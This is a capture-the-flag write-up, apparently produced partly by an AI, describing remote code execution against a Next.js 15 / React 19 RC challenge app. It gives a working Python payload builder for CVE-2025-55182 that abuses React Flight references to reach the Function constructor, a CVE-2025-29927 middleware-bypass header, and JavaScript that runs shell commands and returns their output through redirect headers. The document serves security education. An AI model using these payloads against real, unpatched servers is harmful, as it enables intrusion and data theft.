---
author: Claude
credit: Claude, Fenix
---
## Solution

### Analysis
Initial reconnaissance identified the target as:
- **Next.js 15.0.0** with the App Router
- **React 19.0.0-rc** (release candidate)
- The app uses React Server Components (RSC) and Server Actions
- A `userId` cookie controls which user's log entries are displayed
- A server action with ID `3fee78e8995a129cd1c598459b0203a43f700478` handles log entry creation
- The `Next-Action` header triggers server-side processing of form submissions via the React Flight protocol

These versions are vulnerable to **CVE-2025-55182** (React2Shell), a critical RCE vulnerability in React's server-side `decodeReply` function that deserializes client-provided data without adequate safeguards.

### Approach

**Step 1: Identify the vulnerability.**
The React chunk at `/_next/static/chunks/4bd1b696-6985518451956beb.js` confirmed React version `19.0.0-rc`. Next.js version `15.0.0` was confirmed from chunk `215-c87099246f791b3a.js`. Both fall within the CVE-2025-55182 affected range.

**Step 2: Attempt standard CVE-2025-55182 exploits (failed).**
Multiple published proof-of-concept exploits were tried, including the Chocapikk PoC and variations. All resulted in either timeouts or hangs. The standard approach uses the React Flight protocol's `$F` (server function reference) and `$B` (blocked chunk) primitives to construct a thenable object that triggers code execution when resolved. However, the server-side `decodeReply` implementation sets `_fromJSON = null` on its internal Response object, preventing the standard exploit chain from completing.

**Step 3: CVE-2025-29927 middleware bypass.**
The `x-middleware-subrequest` header bypass (CVE-2025-29927) was confirmed working -- it allows bypassing Next.js middleware by setting:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
This was useful for enumeration but did not directly yield the flag.

**Step 4: Enumerate existing entries.**
Testing various `userId` cookie values revealed entries for `userId=admin` (Captain's Secret Log), `userId=captain` (error state), and `userId=0` (test entries from other participants). None contained the flag directly.

**Step 5: Discover the React Flight protocol internals.**
Deep analysis of the React Flight reply protocol revealed several reference types:
- `$F<id>` -- Server function reference (resolves to the actual function)
- `$B<id>` -- Blocked chunk (creates a thenable/promise)
- `$@<id>` -- Raw chunk reference (accesses the internal chunk object directly)
- `$K<id>` -- FormData reference

The key insight was that `$@<id>` exposes the raw internal chunk object, which contains a `_response` property pointing to the **real** Response object -- not the sanitized one used by `decodeReply`. The real Response's `_fromJSON` function is intact (not null), enabling the exploit chain.

**Step 6: Construct the hybrid RCE payload.**
The exploit uses a multipart form POST with the React Flight protocol:

```python
entries = OrderedDict()
entries["4"] = '"anchor"'                    # Simple string value
entries["5"] = '"$@4"'                       # Raw chunk ref -> internal chunk object
entries["6"] = json.dumps({                  # Fake response with real _fromJSON
    "_fromJSON": "$5:_response:_fromJSON",   # Traverse to real Response's _fromJSON
    "_prefix": RCE_CODE,                     # JavaScript to execute
    "_formData": {"get": "$5:constructor:constructor"},  # Function constructor
    "_chunks": "$5:_response:_chunks"        # Real chunks map
})
entries["0"] = json.dumps({                  # Fake chunk that triggers resolution
    "then": "$5:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then":"$B0"}',              # Blocked chunk triggers thenable
    "_response": "$6"                        # Points to our fake response
})
entries["1"] = '"$@0"'                       # Trigger resolution
entries["2"] = "[]"                          # Empty args
```

The chain works as follows:
1. Entry 4 creates a simple value, entry 5 uses `$@4` to get the raw chunk object
2. From the raw chunk, `$5:_response:_fromJSON` traverses to the real Response's `_fromJSON` function
3. `$5:constructor:constructor` resolves to `Function` (the JavaScript Function constructor)
4. The fake response object (entry 6) is constructed with the real `_fromJSON` and a `_prefix` containing arbitrary JavaScript
5. When the Flight protocol resolves the blocked chunk (`$B0`), it calls `_fromJSON` on the fake response, which uses `Function(prefix)` to evaluate the code

**Step 7: Exfiltrate output via NEXT_REDIRECT.**
Direct output is not possible, so the RCE code throws a `NEXT_REDIRECT` error with the command output base64-encoded in the redirect URL:

```javascript
var res = process.mainModule.require('child_process')
    .execSync('cat /app/flag.txt').toString().trim();
var encoded = Buffer.from(res).toString('base64');
throw Object.assign(new Error('NEXT_REDIRECT'), {
    digest: `NEXT_REDIRECT;push;/login?a=${encoded};307;`
});
```

The server responds with an `X-Action-Redirect` header containing the base64-encoded command output, which is decoded to reveal the flag.

## Flag
`BCCTF{R34c7_S3rv3r_C0mp0n3n7s_RCE_2025}`
